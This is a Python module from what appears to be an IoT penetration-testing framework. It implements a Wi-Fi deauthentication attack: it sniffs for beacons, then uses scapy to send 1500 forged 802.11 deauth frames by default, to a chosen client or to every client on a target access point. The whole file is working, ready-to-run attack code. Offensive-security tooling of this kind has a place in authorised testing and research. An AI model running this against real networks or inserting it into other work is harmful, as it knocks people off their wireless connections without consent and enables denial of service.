from core.ISFFramework import ISFModule, Param
from util.commons import MacAddress
from scapy.all import sniff, conf, sendp
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth, Dot11Beacon, \
    Dot11ProbeResp


@ISFModule(name="Deauth",
           version="1.0",
           description="Sends deauth packets to specified clients",
           author="Not_so_sm4rt_hom3 team")
class DeauthModule:
    in_params = {
        "iface": Param("Target network interface", required=True),
        "ssid_mac": Param("SSID MAC address", value_type=MacAddress,
                          required=True),
        "client_mac": Param("Client MAC address", value_type=MacAddress,
                            required=False,
                            default_value=MacAddress("FF:FF:FF:FF:FF:FF")),
        "packet_count": Param("Number of deauth packets to send",
                              value_type=int,
                              required=False, default_value=1500)
    }

    def __init__(self):
        self.ap_list = list()

    def run(self, params):
        conf.iface = params["iface"]
        pkt = sniff(iface=conf.iface, timeout=1,
                    lfilter=lambda x: x.haslayer(Dot11Beacon) or x.haslayer(
                        Dot11ProbeResp))
        if len(pkt) == 0:
            print("Switch to monitor mode")
        else:
            bssid = str(params["ssid_mac"])
            client = str(params["client_mac"])
            conf.verb = 0
            packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client,
                                        addr2=bssid,
                                        addr3=bssid) / Dot11Deauth(reason=7)
            print("Sending deauth packets...")
            for n in range(params["packet_count"]):
                sendp(packet)
            print("")
            print(
                "Sent %d deauth packets via %s to BSSID %s for client %s" % (
                    params["packet_count"], conf.iface, bssid, client))
